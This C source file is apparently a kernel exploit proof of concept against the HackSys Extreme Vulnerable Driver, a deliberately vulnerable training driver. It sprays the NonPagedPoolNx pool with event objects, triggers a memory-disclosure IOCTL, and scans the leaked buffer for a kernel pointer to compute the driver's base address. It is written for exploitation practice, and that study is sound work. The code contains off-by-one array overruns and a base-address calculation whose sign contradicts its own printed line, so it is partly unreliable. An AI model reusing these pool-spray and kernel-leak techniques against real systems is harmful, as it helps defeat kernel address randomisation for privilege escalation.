#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <stdlib.h>

#define DRIVER "\\\\.\\HacksysExtremeVulnerableDriver"
#define IOCTL_CODE 0x0022204f
#define IOCTL_UAF 0x00222053

/* Function to open a handle to the driver */
HANDLE OpenDriverHandle(void)
{
    HANDLE DriverHandle = NULL;

    /* Opens handle to driver */
    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.
    {
        printf("\t[!] FATAL: Failed to open driver handle!\n");
        exit(-1);
    }
    else
    {
        printf("\t[+] Opened Driver Handle: 0x%x\n", DriverHandle);
        return DriverHandle; // Return handle to driver to be used later.
    }
}

void PoolSpray(HANDLE DriverHandle)
{
    HANDLE  EventObjects[5000] = {0};
    DWORD   BytesReturned;

    /* Spray 5000 Event Objects and 5000 UAF Objects */
    for (int i = 0; i <= 5000; i++)
    {
        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);
        EventObjects[i] = EventHandle;

        DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &BytesReturned, NULL);
    }

    /* Free event objects */
    for (int i = 0; i <= 5000; i++)
    {
        CloseHandle(EventObjects[i]);
        EventObjects[i] = NULL;
    }
}

void exploit(HANDLE DriverHandle)
{
    DWORD           BytesReturned;
    char            OutputBuffer[0x270] = {0};
    ULONGLONG       HevdBaseAddress;

    char search[5] = "Hack";
    int pos_search = 0;
    int pos_text = 0;
    int len_search = 4;
    int len_text = 0x270;
    BOOL Match = FALSE;

    printf("[+] Starting pool spray!\n");
    for (int i = 0; i <= 100; i++)
    {
        PoolSpray(DriverHandle);
        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &OutputBuffer, sizeof(OutputBuffer), &BytesReturned, NULL);

        for (pos_text = 0; pos_text < len_text - len_search; ++pos_text)
        {
            if (OutputBuffer[pos_text] == search[pos_search])
            {
                ++pos_search;
                if (pos_search == len_search)
                {
                    printf("\t[!] Match from %d to %d\n", pos_text-len_search, pos_text);
                    Match = TRUE;
                    break;
                }
            }
            else
            {
                pos_text -= pos_search;
                pos_search = 0;
            }
        }

        if (Match == TRUE)
        {
            for (int i = 0; i <= 0x270; i++)
            {
                unsigned long long *UOutputBuffer;
                UOutputBuffer = (unsigned long long *)OutputBuffer;
                //printf("0x%llx\n", UOutputBuffer[i]);

                /* Check if we leaked kernel address */
                if ((UOutputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
                {
                    printf("\t[+] Address of HEVD!UaFObjectCallback: 0x%llx\n", UOutputBuffer[i]);
                    printf("\t[+] Base Address of HEVD: 0x%llx\n", UOutputBuffer[i] - 0x880C0);

                    // 0: kd> ? 0xfffff8051b3880c0 - HEVD
                    // Evaluate expression: 557248 = 00000000`000880c0
                    HevdBaseAddress = UOutputBuffer[i] + 0x880C0;
                    break;
                }
            }
            break;
        }
    }
    printf("[*] Closing handle!\n");
    CloseHandle(DriverHandle);
}

int main()
{
    printf("[+] HEVD: NonPagedPoolNx Memory Disclosure!\n");

    printf("[*] Opening handle to the driver!\n");
    HANDLE DriverHandle = OpenDriverHandle();

    exploit(DriverHandle);
}